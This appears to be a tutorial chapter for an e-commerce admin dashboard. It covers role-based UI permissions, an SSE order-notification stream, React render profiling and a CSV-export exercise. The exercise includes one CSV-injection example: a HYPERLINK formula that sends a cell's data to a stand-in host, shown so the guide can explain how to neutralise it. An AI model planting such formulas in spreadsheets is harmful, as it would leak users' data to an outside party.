The dashboard's CSP has `style-src 'self'`, which refused Radix's injected `<style>` element (artikel 01). Recharts sets styles too, but differently: React writes the `style` prop through the CSSOM (`element.style.setProperty`), and Recharts measures text in a hidden `<span>` whose style it sets with `Object.assign(span.style, …)`. CSP's `style-src` governs `<style>` elements and `style="…"` in markup (and `setAttribute("style", …)`), not CSSOM property writes, so neither is refused. Checked in the browser, against the production build served with the Caddyfile's exact policy: every step of the report (presets, grouping, tooltip, cumulative, table, dark mode, 375 px) ran with **no** `securitypolicyviolation` event and no console error, while a control `div.setAttribute("style", "color: red")` in the same page was refused (`style-src-attr`), which proves the policy was enforced. No relaxation was needed; the Caddyfile is unchanged.

## Hak akses UI berdasarkan role (artikel 08)

A seller and an admin share the dashboard, but not every button: since Bab 12 only an admin may cancel an order (`POST /v1/admin/orders/{id}/cancel` sits behind `RequireRole(admin)`; everything else under `/v1/admin` is seller and admin). This article makes the dashboard show each role what it may do, with one rule above all: **the UI hides, the API decides.**

### The mental model

| Idea                                  | What it means                                                                                                                                                                                                                   | Go comparison                                                                 |
| ------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------- |
| **One permission table**              | `permissions.ts` lists every action the UI asks about (`dashboard:view`, `order:fulfil`, `order:cancel`) with the roles allowed. Components call `can(role, action)`, never `role === "admin"`                                  | The route groups in `app.go`, written once as data                            |
| **The UI hides, the API decides**     | A wrong entry in the table only shows a button the API refuses (403), or hides one it would allow. Nothing the dashboard does is security; the API checks every request again                                                   | `auth.RequireRole` runs on every request whatever the client shows            |
| **The role comes with the token**     | Login and every refresh answer a new access token and the account, `role` included, from one database read. The dashboard shows that role; the API judges the role inside the token. The two are the same fact, issued together | The JWT claims `RequireRole` reads (`claims.Role`)                            |
| **A 403 is a hint the role is stale** | The dashboard never offers what the role may not do, so a 403 means the session is out of date (or the table is). The interceptor refreshes once, then the page shows the message and the new role together                     | Re-reading the user after `ErrForbidden`, instead of trusting a cached struct |

```
login / refresh ──▶ { access_token (role inside), user (same role) }
                         │                           │
                 sent with every request      can(role, action) → which buttons
                         │
                 API: RequireRole(claims.Role) → 200 or 403
                                                        │
                                   403 → refresh once → new token + new role → UI follows
```

### Decisions

- **One table, mirroring the API** (`features/auth/permissions.ts`). Three actions, because the UI asks three questions: may this role open the dashboard at all (`RequireStaff`), move an order on, cancel one. Each maps to one of the API's route groups, written next to it in the comment, and the file says that the API is the rule: when a group changes in `app.go`, the table changes in the same commit. `as const satisfies Record<string, readonly Role[]>` keeps both the action names (a typo in `can(role, "order:cancle")` does not compile) and the roles typed. Products, photos, stock and reports are not separate actions: the API has no rule that tells a seller from an admin there, and an action no component asks about would be dead code.
- **`RequireStaff` asks the table too.** `isStaffRole` from artikel 01 is gone; the dashboard's gate is `can(role, "dashboard:view")`, so even "who may open the dashboard" lives in the one table.
- **`orderActions(order, role)`** (`order-actions.ts`) now filters twice: what the life cycle allows from the status (artikel 06), then what the role may do (`ACTION_PERMISSION` maps each change to an action). The detail page is the only place a change is offered and it asks only this function, so a seller sees "Batalkan pesanan" nowhere. `withheldOrderActions(order, role)` returns the other half (allowed by the status, not by the role), and the panel turns a withheld cancel into one sentence: "Pembatalan pesanan dilakukan oleh admin toko. Jika pesanan ini perlu dibatalkan, hubungi admin." It appears only while the order could still be cancelled (waiting for payment, paid, processing); under a shipped or completed order it would explain a button nobody has.
- **No route guard, yet.** No page is admin-only today: the PRD's admin features (users and roles, categories, refunds, store settings) have no API, and a page without an API is not built. A `RequirePermission` component with no route to guard would be dead code. The only route-level decision that exists, staff or not, is `RequireStaff`, now table-driven. When the first admin-only page arrives (say `/pengguna`), the guard is a layout route of a dozen lines: `can(useSessionUser().role, "users:manage") ? <Outlet /> : <NoAccessPage … />`, plus the sidebar item filtered by the same `can`.
- **Where the role comes from: the session, not `/v1/me`.** The role on screen must be the role the API judges, and the API judges the role inside the access token (`RequireRole` reads the claims; it does not query the database). Login and refresh return the token and the account from the same database read, so the session's `user.role` and the token always agree. `GET /v1/me` reads the database now and could disagree with the token in either direction: after a demotion it would hide the cancel button while the API still accepts it, after a promotion it would show one the API still refuses.
- **When the role goes stale.** A role changed in the database reaches the token at its next refresh: within one access-token lifetime (15 minutes). A tab that sends requests replaces its token up to 30 seconds early (the proactive refresh runs before a request); an idle tab gets its new token when the event stream ends with `token_expired` and the dashboard refreshes to reconnect (artikel 09). Until then the API still lets a demoted admin cancel. That is the price of a stateless token, and it is the server's to shorten (revoking the user's sessions when the role changes, which `endAccessTokens` already does for a reused refresh token), not the dashboard's. When the refresh brings a new role, the session publishes it and every `can` re-renders with it: the cancel button disappears, or a buyer gets the "Tidak ada akses" page in place of the dashboard. `RoleChangeNotice`, under the user menu, says so ("Peran Anda berubah dari Admin menjadi Penjual. Tindakan yang tersedia sudah disesuaikan.") in a polite `role="status"`, so the vanished button is explained; "Tutup" clears it and returns the focus to the user menu.
- **403: refresh once, then show the message** (`auth-client.ts` step 5, `session-manager.ts` `refreshAfterForbidden`). A 403 to an action the dashboard offered means the session's role and the API disagree: a role changed in the moment between the click and the request, a server that judged by a newer role, or a tab still running yesterday's bundle against an API whose rule got stricter. A refresh fixes the first two with one request (a new token and a new role, together); the interceptor awaits it and then throws the 403, so the panel shows its alert ("Hanya admin yang boleh membatalkan pesanan. Minta admin toko untuk membatalkannya.") in the same render as the new role's buttons and the role notice. For the third, the refresh changes nothing, so it is never repeated: a token issued by a 403 refresh, or already replaced by another request, is not refreshed again for a 403. Three refused cancels in a row cost one refresh, not three. A failed refresh (network) is swallowed; the 403 still reaches the page. A 403 to a request retried after a 401 needs no refresh: its token is seconds old.
- **The 403 message, everywhere.** The order panel keeps its own sentence (artikel 06). A query that gets a 403 shows `ErrorState` with "Peran akun Anda tidak boleh membuka data ini. Jika peran Anda baru saja diubah, muat ulang halaman." (`lib/error-message.ts`). The route error page never sees a 403: no page throws a failed request, so the message stays where the failure happened.
- **The current role is shown where it helps:** the user menu's button ("Sari Seller (Penjual)") and its label ("Peran: Penjual"), the overview's greeting, the no-access page, and the role notice when it changes.

Checked in the browser against a mocked API: a seller sees no cancel button in the queue or the detail, the sentence under a paid or unpaid order and none under a shipped one; an admin cancels with the keyboard (Enter, focus on "Jangan batalkan", Tab, Enter); an admin demoted mid-session gets the 403, exactly one refresh, the focused alert, the seller's buttons, "(Penjual)" and the role notice; three 403s on an unchanged role cost one refresh; a seller made a buyer gets "Tidak ada akses" after their next request; no console error besides the provoked 403 network lines.

## Notifikasi realtime order baru (SSE) (artikel 09)

A new paid order now reaches the dashboard by itself: a toast "Pesanan baru GS-20261030-AAA111 · Rp 117.000" in the corner, a count on the sidebar's **Pesanan**, and the order queries refetched, within seconds of the payment and without a reload. The header says whether the live feed is on: **Langsung**, **Menyambung ulang…** or **Terputus**. The server half is ADR 0009 (`GET /v1/admin/events`, fed by the outbox through Redis pub/sub); this article is the browser's half.

### The mental model

| Idea                             | What it means                                                                                                                                                           | Go comparison                                                                |
| -------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------- |
| **Server-Sent Events**           | One long `GET` whose response never finishes: the server writes `id:`/`event:`/`data:` lines and a blank line per event, and flushes each one                           | A handler that loops `fmt.Fprintf(w, …); flusher.Flush()` until `ctx.Done()` |
| **A stream is bytes, not lines** | The body arrives in chunks that ignore lines, and even split one UTF-8 character in two. Decode as a stream, keep the unfinished line, parse complete lines only        | `bufio.Scanner` over a `net.Conn`: it buffers until a full token is there    |
| **A notification, not the data** | An event says "order X changed"; the queue is refetched from the API, which stays the one source of truth. Missing an event costs a refetch later, never a wrong screen | A cache-invalidation message, not a replicated row                           |
| **At least once, no replay**     | The same `id` may come twice (drop it); nothing sent while disconnected comes again (refetch after every connect)                                                       | An idempotent consumer keyed by message ID, plus a full resync on reconnect  |
| **The connection is a loop**     | Open, read until it ends, decide (refresh? wait? stop?), open again, until the component that owns it unmounts                                                          | `for { err := stream(ctx); … backoff … }` in a goroutine cancelled by `ctx`  |

### Decisions

- **Why SSE, not WebSockets.** The feed is one-way: the server talks, the dashboard listens, and every action (ship, cancel) stays an ordinary REST call. SSE is plain HTTP through the API's existing router, auth middleware, CORS and logs, with nothing extra to proxy or authenticate; a WebSocket would be a second protocol for a direction of traffic the dashboard never uses. ADR 0009 weighs polling and Redis Streams too.
- **Why `fetch`, not `EventSource`.** `EventSource` cannot send an `Authorization` header, and putting the access token in the query string leaves it in access and proxy logs. So the dashboard reads the stream with `fetch` (`Authorization: Bearer`, `Accept: text/event-stream`, `cache: "no-store"`), pipes the body through `TextDecoderStream`, and parses it itself (`features/realtime/event-stream.ts`). Nothing is lost from EventSource: its automatic reconnect would retry with the same, expired token, and it cannot tell a 403 (stop) from a 429 (wait longer).
- **The parser is spec-correct and framework-free** (`features/realtime/sse-parser.ts`, from the HTML standard's "event stream interpretation"): `\r\n`, `\n` and a lone `\r` all end a line, including a `\r\n` cut between two chunks; a leading BOM is dropped once; `:` lines are comments; several `data:` lines join with `\n`; `id:` with a NUL is ignored and the last ID carries over; an event without `data:` is not dispatched; an event cut off by the end of the stream is discarded; unknown fields are ignored. A character split between chunks is TextDecoderStream's job: it keeps the bytes until the rest arrive. **`retry:` is parsed but not honoured**: the API never sends one, and the reconnect policy below is more than one number can express.
- **Why it lives in `apps/admin`, not `packages/shared`.** Only the dashboard reads this stream: the mobile app is the buyer's. React Native's `fetch` has no streaming body and Hermes has no `TextDecoderStream`, so the transport would not move as it is anyway. The parser itself takes strings and touches no DOM, so moving it to `packages/shared` later (with its tests, for the package's 70% per-file coverage) is a file move. Only the generated type `AdminOrderEvent` went into `@goshop/shared`.
- **The reconnect rules** (`features/realtime/connection.ts`):

  | What happened                                       | What the dashboard does                                                                       |
  | --------------------------------------------------- | --------------------------------------------------------------------------------------------- |
  | `event: end`, `{"reason":"token_expired"}`          | refresh the token through the session, then reconnect at once                                 |
  | `event: end`, `{"reason":"shutdown"}`               | reconnect within a second (jittered, so a stopped instance's dashboards do not arrive as one) |
  | closed without `end`, or a network error            | back off: 1, 2, 4 … 30 s, "equal jitter" (a random point in the upper half)                   |
  | nothing at all for 60 s                             | the same: two missed 25-second heartbeats mean a dead connection nobody announced             |
  | `401` when connecting                               | refresh once and reconnect at once; a second `401` in a row backs off                         |
  | `403`                                               | stop: the role will not change by retrying                                                    |
  | `429 TOO_MANY_STREAMS` (5 per account per instance) | back off longer, 30 s to 2 min, and say "too many tabs"                                       |
  | the refresh says the session is over                | stop; the login page takes over                                                               |

  A stream that stayed open at least 10 seconds resets the backoff; one that the API opens and closes at once keeps backing off instead of reconnecting (and refetching) every second. Coming back online (`window` `online`) or pressing **Coba lagi** resets the backoff and tries now: it cuts a wait short, or, while an attempt is on its way and its stream has not opened, abandons that attempt for a new one (`retryNow`). Without the second half the button did nothing during an attempt, and an attempt sent while offline can hang until the 60-second idle timer; a live stream is never cut.

- **The token goes through the session, under its lock.** The session context now also offers `tokens` (`ensureFreshToken`, `refreshAfterUnauthorized`), the same two functions `createAuthClient` uses. Before connecting, a token in its last 30 seconds is replaced first. After `token_expired` or a `401`, `refreshAfterUnauthorized(staleToken)` refreshes, unless another request has already done so, and it shares a refresh already on its way and the cross-tab Web Lock (`refresh-lock.ts`), so a stream that expires at the same moment as a request does not rotate the cookie twice.
- **When it is open: while the dashboard layout is mounted.** `OrderEventsProvider` sits in `DashboardLayout`, which only renders for a seller or an admin (`RequireStaff`). Logging out unmounts it, and the cleanup aborts the `fetch`: the stream closes at once, nothing reconnects. React's StrictMode mounts it twice in development; the first stream is aborted before the second opens, so one tab holds one stream (checked against the mock server: never more than one open).
- **Not paused in a background tab.** A seller keeps the dashboard in a tab while working in others, and that is exactly when a notification is worth something; a stream that closes when hidden would deliver the news only once they come back, when the refetch would have shown it anyway. The cost of an idle stream is one HTTP connection and one Redis subscription, with a heartbeat every 25 s; the per-account limit of 5 caps a seller with many tabs, and the 429 rule handles the sixth. Browsers throttle timers in hidden tabs, which only makes backoff waits and the idle check late, never early. What does wait for the seller: a toast's auto-dismiss timer only runs while the tab is visible.
- **Refetch, not patch.** On every connect (first included: anything between the page's own fetch and the subscription would otherwise be missed) and on every order event, every order query is invalidated: `orderKeys.all` from artikel 06's key factory (`["admin", "orders"]`), never a key written a second time. The event carries an order's new status, but the queue's tabs, counts and cursor pages depend on every order; refetching is always right, and the API is the one source. Events come in bursts (the worker publishes the outbox every 5 seconds), so invalidations are gathered for 250 ms: ten orders paid in one run are one refetch.
- **A refetch and "Muat lebih banyak" never cancel each other** (`invalidateWithoutCancelling` in `features/orders/api/queries.ts`, `OrdersPage.tsx`). TanStack Query's `invalidateQueries` cancels a fetch on its way and starts over (`cancelRefetch: true` by default), and an infinite query's refetch reloads only the pages already in the cache. So a seller who pressed "Muat lebih banyak" just before an event (or a reconnect) arrived lost the page being loaded and was back at page 1: the request was aborted and the list shrank to 20 orders. The invalidation now joins a fetch already running (`cancelRefetch: false`) and, once it is done, invalidates that query again, because it started before the event and a next page refreshes only itself: the next page is kept, then every loaded page is reloaded from the first. The other direction is the button's: `fetchNextPage` would cancel a refetch just as well (and the orders the event announced would be missing from the top), so while the queue refetches the button says "Memuat…" and is `aria-disabled`, exactly as while its own page loads. Checked against a mock stream with a slow next page: an event 100 ms after the press, and a reconnect (`end`, `shutdown`) 50 ms after it, both kept 40 orders with no aborted request (before: 20, the next page aborted); a press during an event's refetch neither aborted it nor loaded a page.
- **The sales report follows revenue.** Artikel 07's report counts the orders paid in the range that were not cancelled afterwards (`paid`, `processing`, `shipped`, `completed`), so two events change it: `order.paid` adds an order, `order.cancelled` may remove one (the event does not say whether it had been paid, so every cancellation counts). Those two also invalidate `reportKeys.all`, in the same gathered refetch, so the chart on `/laporan` and the overview's tile stay live; `order.created` (not paid yet) and processing → shipped → completed (already counted) leave the report alone (`changesSalesReport` in `order-event.ts`). A connect invalidates the reports too: what was missed while closed may include payments. Only a report on screen refetches; the others are marked stale for the next time they are shown. The API answers `200` only after it has subscribed, so a refetch started on `onOpen` cannot miss an event published before it.
- **Duplicates by `id`.** The dispatcher may publish an event twice. A bounded set of the last 500 IDs (`recent-ids.ts`, a `Set` that drops its oldest entry) is kept for the tab's life, across reconnects. The JSON is checked at run time (`parseOrderEvent`): an event type this client does not know is skipped, and the next refetch shows its effect anyway.
- **What makes a toast.** Only `order.paid`: that is when an order needs the seller. `order.created` is not paid yet; `processing`, `shipped`, `completed` and `cancelled` are the staff's own work. Every type still refetches. The toast shows the order code and the total only: the event carries no buyer data (ADR 0009's allowlist), and the dashboard shows none.
- **The unread count** on **Pesanan** counts new paid orders since the orders page was last open: it is not raised while that page (or a page under it) is open, because the queue refreshes in front of the seller, and it goes back to 0 when the page opens (adjusted during render when the path changes, not in an effect that would paint the old number first). It is a number in a badge plus a `sr-only` "pesanan baru", so the link reads "Pesanan 2 pesanan baru"; the number caps at "99+". In memory only: a reload starts at 0, and the refetched queue is the record.
- **The toast is accessible without stealing anything.** Two parts: a `role="status"` `aria-live="polite"` region that holds only the newest sentence (a live region reads everything added to it, so a toast with buttons inside would be announced with "Lihat pesanan Tutup notifikasi"), and the visible stack, a `<section aria-label="Notifikasi pesanan">` with a list, last in the DOM so Tab reaches it after the page. Nothing ever moves the focus by itself: the seller may be typing in a form. Each toast has **Lihat pesanan** (a link) and a close button named "Tutup notifikasi Pesanan baru …"; Escape closes the one with the focus, and the focus goes to the next toast or to `<main>`, never to `<body>`. Toasts leave after 8 seconds, paused while the pointer is over the stack, while the focus is in it, and while the tab is hidden; at most 3 are shown. Dismissing never re-announces an older toast (the region's text is its own state, not "the last toast").
- **The status indicator** (`ConnectionStatus.tsx`) is a dot and a word; the word carries the meaning and the dot only repeats it. A screen reader hears "Notifikasi pesanan: Terputus" and, when it is down, why (unreachable, too many tabs, no permission, session over); sighted users get the same sentence as a tooltip. **Coba lagi** appears only where retrying can help (unreachable, too many tabs). It is not a live region: a feed that blinks through "Menyambung ulang…" would interrupt whatever is being read, and nothing is lost meanwhile.

### Checked in a browser

Against a small Node server speaking real `text/event-stream` (chunked writes, CORS for the dev origin) and the dev server, with Playwright: a frame cut into 3-byte pieces, with `\r\n` line ends, a BOM, a multi-byte character split mid-sequence, an unknown field, `retry:` and a multi-line `data` event, produced exactly one toast; a repeated `id` produced none; three events in one burst produced one refetch; `token_expired` led to one refresh and a reconnect with the new token; `shutdown` reconnected within a second with the same token; a dropped socket showed "Menyambung ulang…" and reconnected after 0.5–1 s; a failing API backed off 1–2, 2–4, 4–8 s and showed "Terputus" after three failures; a `401` refreshed once and reconnected; a `429` waited (no retry within 4 s); a `403` stopped for good; 60 silent seconds reconnected; logging out closed the stream with no reconnect. The only console errors were Chrome's own "Failed to load resource" lines for the deliberately refused or dropped requests.

## Performance profiling dan re-render yang tidak perlu (artikel 14)

Measure first, fix only what the numbers show, measure again. Two components got `memo`, and nothing else changed: every other suspect was measured and left alone, with its number below.

### The mental model

| Idea                              | What it means                                                                                                                                                                            | Go comparison                                                           |
| --------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------- |
| **A render is not a DOM change**  | React calls a component again whenever its parent renders, its state changes or a context it reads changes; it then compares the result and touches the DOM only where something differs | Recomputing a value nobody reads: cheap once, measurable in a hot loop  |
| **Commit**                        | One pass of React applying updates: every component it called, then one DOM update. A click that sets state, then a URL change, then a response is three commits                         | One transaction                                                         |
| **actual vs base duration**       | `actual`: the time spent rendering what this commit rendered. `base`: what rendering the whole tree from scratch would cost. Actual close to base means nothing was skipped              | `pprof` time of the call vs. the cost of the whole handler              |
| **`memo` skips, it does not fix** | A memoised component is skipped when its props are the same objects as last time. It only helps where the props really stay the same, and every prop must                                | A cache keyed on the inputs: worthless if the key changes on every call |

### How it was measured

- **The tool.** React DevTools' Profiler tab shows the same data by hand (record, act, stop; "Highlight updates when components render" in its settings flashes every re-render). For numbers that repeat, a Playwright script drove the dashboard and read each commit through `__REACT_DEVTOOLS_GLOBAL_HOOK__`, the hook DevTools itself uses: which components rendered (React's `PerformedWork` flag, walking only the subtrees that changed, as DevTools does), and the root's `actualDuration` and `treeBaseDuration`. The script and its mock API stay outside the repository: about 400 lines that need Playwright, a mock API server and a profiling Vite config, none of which the dashboard depends on. So the numbers below are one machine's measurements, there to show the method and the size of the effect, not a benchmark to reproduce digit for digit; the Profiler tab or `<Profiler>` below gives a reader the same kind of numbers on their own machine. Nothing in the app was changed to measure it. React's `<Profiler id="…" onRender={(id, phase, actual, base) => …}>` reports the same two durations for one subtree, if you prefer it in code.
- **Realistic sizes, mocked API.** 250 products shown 100 per page (`?per_halaman=100`), a "Dibayar" queue of 50 orders (two "Muat lebih banyak"), the 30 → 90 day sales report per day, and a real `text/event-stream` pushing bursts of 5–10 order events.
- **Two builds.** The dev server (`pnpm dev:admin`, StrictMode, unminified React with its checks) and a production build with React's profiling build of react-dom (`resolve.alias: react-dom/client → react-dom/profiling`, the only difference from `pnpm build`). Dev numbers are only good for comparing with each other; the production numbers are what a seller's browser does.
- **Median of 7 runs** per scenario (5 for the event scenarios), each in a fresh browser context. Apple M2 Pro, macOS 26.3, Chromium 156, React 19.3, TanStack Table 9.3, Recharts 3.10.

Each table interaction is three commits: the control's own update (artikel 02's `pending`, so the select and checkbox do not flicker), the URL arriving through React Router's transition, and the response. Only the third changes a row, yet all three re-rendered the whole page of 100 rows, some 3,100 components each. The second sort after a page load, per commit (dev, components / actual ms):

| Commit                  | Before       | After        |
| ----------------------- | ------------ | ------------ |
| 1. the control's update | 3,143 / 17.1 | 74 / 1.6     |
| 2. the URL arrives      | 3,182 / 18.3 | 213 / 4.8    |
| 3. the response arrives | 3,140 / 96.9 | 3,141 / 99.4 |

The report page had the same shape, made larger by Recharts: changing the range re-rendered both charts and the 90-row data table with the old report twice, and each time Recharts synchronised its internal store in three more commits: ten commits (two of them empty) and about 4,200 components before the new report arrived.

**The fixes** (`memo` with a one-prop boundary, where the prop provably stays the same object):

- `ProductTableBody` in `features/products/components/ProductTable.tsx`: the `<tbody>`, taking only `rows`. Header, caption, `aria-sort`, pagination and the busy state still render on every commit; they are cheap.
- `ReportBody` in `features/reports/components/ReportsPage.tsx`: tiles, both charts, the data table and the top 5, taking only `report`. Its own "Tampilkan kumulatif" state still re-renders it.

### React Compiler

React Compiler (`babel-plugin-react-compiler`) memoises components and values automatically at build time, which would have produced both fixes above, and more. It is **not** enabled here, on purpose: it changes how every component of the dashboard is compiled, which deserves its own change with its own tests, not a side effect of one article, and TanStack Table's docs warn that a compiler-memoised child can hide reads made through the table's builder methods (`row.getAllCells()`, `column.getIsSorted()`), which need a `table.Subscribe` boundary to stay live. If it is enabled later, the profiling scenarios above are the way to check it: the component counts should fall at least as far, and nothing on screen should stop updating.

### What this chapter found

The chapter's code was checked in stages (build, tests, database audit, integration, review), and most of what is worth teaching was found there, not planned. Each item names the commit that fixed it (`git show <sha>` has the whole story in its message).

- **One version was not enough lock.** The edit form sent each variant's `version`, and the API checked those, so a checkout between "open" and "save" was caught. But nothing covered the product's own fields or its set of variants: a stale form whose variants were untouched silently overwrote another admin's name, and archived, for good, a variant another admin had added after the form loaded. The fix was a `version` on the product too (`ff3933fe`, ADR 0006): every save and archive bumps it, stock never does. A lock is per thing that can change, and "the variants" and "the product" are two things. The UI then stopped answering a 409 with "reload, your edits are gone" and merges three ways instead (`20e53c2e`, `55d9af61`), the way `git merge` does: what only the server changed is taken, what only the seller changed is kept, and only what both changed is a question.
- **An error code is contract; an error message is not.** A save naming an archived variant first came back as `400 VALIDATION_FAILED`, which the dashboard could recognise only by reading the message. It became `409 VARIANT_ARCHIVED` (`c38c7984`), and with the product's version it turned out to be a fallback only: a concurrent archive is the product's `VERSION_CONFLICT` first (`2750bc92`; artikel 05's section words it so).
- **A difference composes, a count does not.** "+20 received" is right whatever was sold meanwhile; "I counted 15" is right only if nothing moved. So the stock change is two operations, `{delta}` and `{set, expected}` (`19052077`). The database audit then found that capping the result at 1,000,000 in both directions trapped a stock a cancellation had restored above the cap: even "-1 rusak" was refused. Only increases are capped now (`2750bc92`).
- **Two apps, one API host, one cookie: one session.** The storefront and the dashboard shared `goshop_refresh`, so logging in to one logged out the other, and tabs of both refreshing at once could trip the API's token reuse detection. One header, `X-GoShop-Client: admin`, gives the dashboard its own cookie (`c3df3e15`, `f88ddcd8`, tested in `7ea78ec7`).
- **The URL as state flickers under transitions.** React Router applies a new URL inside a transition, so a checkbox controlled only by the URL snapped back for a moment after each click. An urgent `pending` value, replaced by the next URL to arrive, fixed it without giving up the URL as the source (`b1a9bb4c`), and artikel 02 explains why `useOptimistic` does not fit.
- **A CSP is checked against what a library really does.** Radix's Dialog injects a `<style>` element, which `style-src 'self'` refuses, so menus and dialogs are non-modal or the browser's own `<dialog>`. Recharts sets styles through the CSSOM, which `style-src` does not govern, so it needed no relaxation, and that was proven in the browser against the exact policy, with a control that the policy was enforced (artikel 07).
- **A 403 means the role is stale.** The dashboard never offers what the role may not do, so a 403 to an offered action means the session is out of date: refresh once, then show the message together with the new role's buttons (`d0700b2c`). Never twice: a stale table would loop.
- **A stream needs rules, not just a reconnect.** `EventSource` cannot send a bearer token and cannot tell a 403 (stop) from a 429 (wait longer). Reading SSE with `fetch` made every case explicit: the server's `event: end` with its reason, backoff with jitter, a 60-second silence check, refetch after every connect because there is no replay (artikel 09, ADR 0009). Invalidating through the key factories kept the report live too (`749e7c0b`). And invalidation has a default worth knowing: `invalidateQueries` cancels a fetch on its way, which dropped a "Muat lebih banyak" pressed just before an event; the queue now joins the running fetch and refetches after it (artikel 09's section, "A refetch and 'Muat lebih banyak' never cancel each other").
- **Measure before `memo`.** Every table interaction is three commits, and each re-rendered all 100 rows (some 3,100 components) though only the last changed one. Two `memo` boundaries, where the props provably stay the same object, cut the work to a third; nine other suspects were measured and left alone, with their numbers (`f2373f9f`).
- **The database audit reads plans, not code.** The low-stock filter computed an aggregate over every variant of every product before filtering: 100,000 buffers and 50 ms at 20,000 products. An `EXISTS` that stops at the first match returns the same rows (`7311064e`).

### Challenge: export the sales report to CSV

A seller wants the numbers of `/laporan` in a spreadsheet: to add their own costs, to send to an accountant, to keep a month's report. Add two buttons to the report page, **"Unduh data per periode (CSV)"** and **"Unduh produk terlaris (CSV)"**, each with the table it exports. There is no solution in the code; each part names the article it leans on.

**The data: exactly the report on screen** (artikel 07). Export what the page already holds, the cached response for the URL's range and grouping, with no new request. Watch `placeholderData: keepPreviousData`: while the next range loads, `data` is still the _previous_ report. The buttons are `aria-disabled` while `isPlaceholderData` (or still loading), and the file's name and dates come from the response (`report.from`, `report.to`, `report.group`), never from the URL, so a file can never claim one range and hold another.

**The columns.** The per-period file, one row per entry of `series`, the same columns whatever the grouping (a sheet someone builds formulas on must not change shape):

| Header                       | Value                                                                                  |
| ---------------------------- | -------------------------------------------------------------------------------------- |
| `Periode mulai`              | the first day counted, `YYYY-MM-DD` (a first week or month may start before the range) |
| `Periode selesai`            | the last day counted, `YYYY-MM-DD`                                                     |
| `Sebagian`                   | `ya` when the period was cut by the range, else `tidak` (the chart's "(sebagian)")     |
| `Pesanan`                    | `order_count`                                                                          |
| `Pendapatan (Rp)`            | `revenue.amount`                                                                       |
| `Rata-rata per pesanan (Rp)` | `average_order_value.amount`                                                           |
| `Pendapatan kumulatif (Rp)`  | `cumulative_revenue.amount`                                                            |

The top-products file: `Peringkat` (the API's `rank`: ties share one), `Produk` (the name), `ID produk`, `Unit terjual`, `Pendapatan (Rp)`. No total row in either file: a sum over a column that contains its own total counts everything twice, and the total is one formula away.

**The decisions, with hints:**

1. **Raw numbers, not formatted ones.** "Rp 1.650.000" is text to every spreadsheet and cannot be summed. "1.650.000" is a number to an Excel set to Indonesian and 1.65 or text to one set to English. Rupiah are whole numbers, so plain digits (`1650000`) mean the same in every locale; the unit goes in the header. The UI's `formatRupiah` is for eyes, not files.
2. **ISO dates.** `2026-10-01` is read as a date by Excel in any regional setting, by Google Sheets and by LibreOffice. "1 Okt 2026" is text, and "01/10/2026" is the 10th of January to an American Excel. The dates are Jakarta calendar dates already (artikel 07): no `Date` object, no time zone, no `toISOString()` on a local midnight. `periodDays` in `features/reports/report-format.ts` gives the counted days and the partial flag.
3. **`;` as the separator.** Excel opens a double-clicked `.csv` with the operating system's list separator: `;` under Indonesian regional settings (where `,` is the decimal separator), `,` under English ones. A comma file opens in one column for the sellers this dashboard is for. Write `;`; since every number is an integer, no decimal comma can collide with it. Do not add Excel's `sep=;` first line: other programs read it as data, and Excel then ignores the BOM. Offering a choice ("Excel Indonesia (;)" or "Standar (,)") is a fine extra.
4. **UTF-8 with a BOM.** Without a byte order mark, Excel on Windows reads a CSV in the system's legacy code page, and "Kopi Gayo — 250 g" or "Café" arrive garbled. Start the file with U+FEFF once (bytes `EF BB BF`); Sheets and LibreOffice drop it.
5. **Quoting, RFC 4180.** A field that contains the separator, a `"`, a CR or an LF is wrapped in `"…"`, with every `"` inside doubled; lines end with CRLF. A product called `Kaos "Vintage"; L` must come back as one cell with exactly that text.
6. **CSV injection.** A spreadsheet runs a cell that starts with `=`, `+`, `-` or `@` (OWASP adds a leading tab and CR) as a formula: a product named `=HYPERLINK("https://contoh.invalid/?d="&B2;"Klik")` becomes a link that sends the next cell away. Product names are typed by staff, and the person opening the file trusts it because it came from the dashboard. Prefix such a _text_ cell with `'` before quoting; never touch the numeric columns (the guard would turn numbers into text). The visible `'` is the accepted price.
7. **The file name.** `goshop-penjualan_2026-10-01_2026-10-30_per-hari.csv` and `goshop-produk-terlaris_2026-10-01_2026-10-30.csv`: ASCII, no spaces or colons (Windows refuses `:`), dates first-to-last so a folder sorts them.
8. **The download.** A `Blob` (`type: "text/csv;charset=utf-8"`), `URL.createObjectURL`, a temporary `<a download="…">` clicked, and `URL.revokeObjectURL` afterwards, so the file does not stay in memory for the tab's life (artikel 04 counted its object URLs; count these too). The file is at most 366 rows: no streaming, no library. Writing CSV is a short pure function; a library such as Papa Parse earns its place when _reading_ CSV.
9. **The CSP needs nothing.** Checked in Chromium against the dashboard's policy with `blob:` removed from `img-src`: the download went through with no `securitypolicyviolation`, because no CSP directive governs a download. `connect-src` does govern `fetch(blobUrl)`, which the same page refused (the control that the policy was enforced). So the Caddyfile does not change; adding `blob:` anywhere for this would be a hole for nothing.
10. **Accessibility.** Real `<button>`s whose visible text says the format, the icon `aria-hidden`, and a description of what they export (`aria-describedby` on the report's status line, "1–30 Okt 2026, per hari"). While the data is not ready they are `aria-disabled`, not `disabled`, so the focus stays (artikel 06). A download gives a screen reader no feedback, so a polite status says "File goshop-penjualan_….csv diunduh." and the focus stays on the button.
11. **Who may export.** Sellers and admins, like the report itself. That is not a new entry in `permissions.ts`: the API has no rule that tells them apart here, and artikel 08's table holds only questions the UI really asks.
12. **Where the code goes.** A pure function from the report to the CSV text (`features/reports/report-csv.ts`), one small DOM helper for the download (`lib/download-file.ts`), the buttons in `ReportsPage.tsx`. It all stays in the lazy reports chunk (artikel 07): check the main bundle did not grow.

**Acceptance criteria:**

- Both files download from the keyboard (Tab, Enter) on `/laporan` with data, and are named from the response's range and grouping.
- The bytes start with `EF BB BF`, the separator is `;`, lines end with CRLF, the header row is exactly as above.
- The per-period file has as many rows as `series` (the data table's rows, without its total); `Pendapatan (Rp)` sums to `totals.revenue.amount`, and the last `Pendapatan kumulatif (Rp)` equals it. A range with no sales exports real zeros.
- With grouping per week or month, a period cut by the range shows only its counted days and `Sebagian` = `ya`.
- A product named `Kaos "Vintage"; L`, one with a line break, and one named `=1+1` each open as one cell with the same text (the last one with a leading `'`, shown as text, not 2); numeric columns are never prefixed.
